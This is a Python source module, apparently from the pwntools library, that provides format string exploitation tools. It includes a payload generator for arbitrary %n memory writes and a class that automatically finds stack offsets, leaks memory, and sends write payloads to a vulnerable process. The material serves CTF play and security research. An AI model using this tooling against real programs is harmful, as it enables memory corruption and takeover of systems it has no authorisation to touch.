"""
Provide some tools to exploit format string bug

Example - Payload generation
^^^^^^^^^^^^^^^^^^^^^^^^^^^^

::

    # we want to do 3 writes
    writes = [(0x08041337,   0xbfffffff),
              (0x08041337+4, 0x1337babe),
              (0x08041337+8, 0xdeadbeef)]

    # the printf() call already writes some bytes
    # for example :
    # strcat(dest, "blabla :", 256);
    # strcat(dest, your_input, 256);
    # printf(dest);
    # Here, numbwritten parameter must be 8
    payload = fmtstr.make_payload(5, writes, numbwritten=8)

Example - Automated exploitation
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

::

	# Assume a process that reads a string
	# and gives this string as the first argument
	# of a printf() call
	# It do this indefinitely
	p = process('./vulnerable')

	# Function called in order to send a payload
	def send_payload(payload):
		log.info("payload = %s" % repr(payload))
		p.sendline(payload)
		return p.recv()

	# Create a FmtStr object and give to him the function
	format_string = fmtstr.FmtStr(execute_fmt=send_payload)
	format_string.write(0x0, 0x1337babe) # write 0x1337babe at 0x0
	format_string.write(0x1337babe, 0x0) # write 0x0 at 0x1337babe
	format_string.execute_writes()

"""
import logging
import re

from pwnlib.log import getLogger
from pwnlib.memleak import MemLeak
from pwnlib.util.cyclic import *
from pwnlib.util.fiddling import randoms
from pwnlib.util.packing import *

log = getLogger(__name__)

def make_payload(offset, writes, numbwritten=0, nformater=4):
    """make_payload(offset, writes, numbwritten=0, nformater=4) -> str

    Makes payload with given parametersself.

    Arguments:
        offset(int): the first formatter's offset you control
        writes(list): list of tuple, each tuple must be composed as ``(where, what)``
        numbwritten(int): number of byte already written by the printf function
        nformater(int): must be 4, 2 or 1. Tells if you want to write byte by byte, short by short or directly an int

    Returns:
        The payload in order to do needed writes

    Examples:
        >>> fmtstr.make_payload(1, [(0x0, 0x1337babe)])
        '\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\\x00%174c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn'
        >>> fmtstr.make_payload(1, [(0x0, 0x1337babe)], nformater=2)
        '\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00%47798c%1$hn%22649c%2$hn'
        >>> fmtstr.make_payload(1, [(0x0, 0x1337babe)], nformater=1)
        '\\x00\\x00\\x00\\x00%322419386c%1$n'

    """

    for where, what in writes:
        if where > 0xFFFFFFFF or what > 0xFFFFFFFF or context.bits != 32:
            log.error("can only build 32bits arch payload...")

    if nformater not in [1, 2, 4]:
        log.error("nformater must be 1, 2 or 4")

    # add wheres
    payload = ""
    for where, what in writes:
        for i in range(0, 4, 4/nformater):
            payload += pack(where+i)

    numbwritten += len(payload)
    mask = int(4/nformater * "FF", 16)
    fmtCount = 0
    for where, what in writes:
        for i in range(0, 4, 4/nformater):
            current = what & mask
            if numbwritten & mask <= current:
                to_add = current - (numbwritten & mask)
            else:
                to_add = (current | (mask+1)) - (numbwritten & mask)

            if to_add != 0:
                payload += "%%%dc" % to_add
            payload += "%%%d$%sn" % (offset + fmtCount, nformater/2 * "h")

            numbwritten += to_add
            what >>= 4/nformater*8
            fmtCount += 1

    return payload

class FmtStr(object):
    """
    Provides an automated format string exploitation.

    It takes a function which is called every time the automated
    process want to communicate with the vulnerable process. this
    function takes a parameter with the payload that you have to
    send to the vulnerable process and must return the process
    returns.

    If the `offset` parameter is not given, he try to find the right
    offset by leaking stack datas.

    Arguments:
            execute_fmt(function): function to call for communicate with the vulnerable process
            offset(int): the first formatter's offset you control
            padlen(int): size of the pad you want to add before the payload
            numbwritten(int): number of already written bytes

    """

    def __init__(self, execute_fmt, offset = None, padlen = 0, numbwritten = 0):
        """
        Instantiates an object which try to automating exploit the vulnerable process

        Arguments:
            execute_fmt(function): function to call for communicate with the vulnerable process
            offset(int): the first formatter's offset you control
            padlen(int): size of the pad you want to add before the payload
            numbwritten(int): number of already written bytes
        """
        self.execute_fmt = execute_fmt
        self.offset = offset
        self.padlen = padlen
        self.numbwritten = numbwritten


        if self.offset == None:
            self.offset, self.padlen = self.find_offset()
            log.info("Found format string offset: %d", self.offset)

        self.writes = []
        self.leaker = MemLeak(self._leaker)

    def leak_stack(self, offset, prefix=""):
        leak = self.execute_fmt(prefix+"START%%%d$pEND" % offset)
        try:
            leak = re.findall(r"START(.*)END", leak, re.MULTILINE | re.DOTALL)[0]
            leak = int(leak, 16)
        except ValueError:
            leak = 0
        return leak

    def find_offset(self):
        marker = cyclic(20)
        for off in range(1,1000):
            leak = self.leak_stack(off, marker)
            leak = pack(leak)

            pad = cyclic_find(leak)
            if pad >= 0 and pad < 20:
                return off, pad
        else:
            log.error("Could not find offset to format string on stack")
            return None, None

    def _leaker(self, addr):
        # Hack: elfheaders often start at offset 0 in a page,
        # but we often can't leak addresses containing null bytes,
        # and the page below elfheaders is often not mapped.
        # Thus the solution to this problem is to check if the next 3 bytes are
        # "ELF" and if so we lie and leak "\x7f"
        # unless it is leaked otherwise.
        if addr & 0xfff == 0 and self.leaker._leak(addr+1, 3, False) == "ELF":
            return "\x7f"

        fmtstr = randoms(self.padlen) + pack(addr) + "START%%%d$sEND" % self.offset

        leak = self.execute_fmt(fmtstr)
        leak = re.findall(r"START(.*)END", leak, re.MULTILINE | re.DOTALL)[0]

        leak += "\x00"

        return leak

    def execute_writes(self):
        """execute_writes() -> None

        Makes payload and send it to the vulnerable process

        Returns:
            None

        """
        fmtstr = randoms(self.padlen)
        fmtstr += make_payload(self.offset, self.writes, numbwritten=self.padlen, nformater=4)
        self.execute_fmt(fmtstr)
        self.writes = []

    def write(self, addr, data):
        """write(addr, data) -> None

        In order to tell : I want to write ``data`` at ``addr``.

        Arguments:
            addr(int): the address where you want to write
            data(int): the data that you want to write ``addr``

        Returns:
            None

        """
        self.writes.append((addr, data))
